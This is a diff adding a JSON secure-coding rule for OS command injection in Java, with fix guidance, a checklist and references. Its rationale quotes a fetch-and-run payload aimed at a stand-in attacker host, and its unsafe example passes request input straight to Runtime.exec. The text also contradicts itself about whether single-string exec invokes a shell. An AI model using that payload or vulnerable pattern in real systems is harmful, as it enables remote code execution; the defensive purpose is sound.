@@ -1,0 +1,30 @@
+{
+  "rule_id": "SC-JAVA-CMD-001",
+  "version": "1.0.0",
+  "title": "OS Command Injection via unsanitized input",
+  "summary": "User-controlled input flows into an operating system command execution API (Runtime.exec or ProcessBuilder) without validation. An attacker can inject shell metacharacters to execute arbitrary commands on the server.",
+
+  "why_it_matters": "Command injection is one of the most severe vulnerability classes — successful exploitation gives an attacker the same privileges as the application process, which is often enough to read secrets, install backdoors, pivot to internal networks, or exfiltrate data. Automated exploitation is straightforward: appending `; curl attacker.com/shell.sh | sh` to a vulnerable parameter is a textbook attack.",
+
+  "how_to_fix": "The safest fix is to eliminate shell invocation entirely. If you must execute external processes:\n\n1. Never pass user input directly to Runtime.exec() or ProcessBuilder with a single string argument (which invokes a shell).\n2. Use ProcessBuilder with an explicit argument array — this bypasses the shell and prevents metacharacter injection.\n3. Validate user input against a strict allowlist of permitted values before use.\n4. If the command set is fixed, use an enum or switch statement to map user input to pre-defined commands — never let user input become part of the command string.\n5. Consider whether the functionality can be reimplemented in Java without shelling out (e.g., use java.nio.file for file operations instead of calling `ls` or `cp`).",
+
+  "unsafe_example": "// UNSAFE: user input passed directly to exec\nString cmd = request.getParameter(\"cmd\");\nRuntime.getRuntime().exec(cmd);",
+
+  "safe_example": "// SAFE: explicit argument array, no shell invocation\nString filename = request.getParameter(\"filename\");\n// Validate against allowlist\nif (!ALLOWED_FILES.contains(filename)) {\n    throw new SecurityException(\"disallowed filename\");\n}\nProcessBuilder pb = new ProcessBuilder(\"cat\", \"/opt/reports/\" + filename);\npb.redirectErrorStream(true);\nProcess p = pb.start();",
+
+  "developer_notes": "Runtime.exec(String) splits the string by whitespace and passes to the OS. On Unix, this does NOT invoke a shell, but it still allows argument injection. Runtime.exec(String[]) and ProcessBuilder(List<String>) are safer because each argument is a separate array element. However, the safest approach is always to avoid exec entirely and use Java APIs.",
+
+  "verification_checklist": [
+    "User input is never concatenated into a command string",
+    "ProcessBuilder uses an explicit argument array, not a single string",
+    "Allowed commands or arguments are validated against a strict allowlist",
+    "Shell invocation is avoided where Java APIs can accomplish the same task",
+    "Error handling does not leak command output to the user"
+  ],
+
+  "references": [
+    {"title": "CWE-78: OS Command Injection", "url": "https://cwe.mitre.org/data/definitions/78.html"},
+    {"title": "OWASP Top 10 A03:2021 Injection", "url": "https://owasp.org/Top10/A03_2021-Injection/"},
+    {"title": "OWASP OS Command Injection Defense Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html"}
+  ]
+}
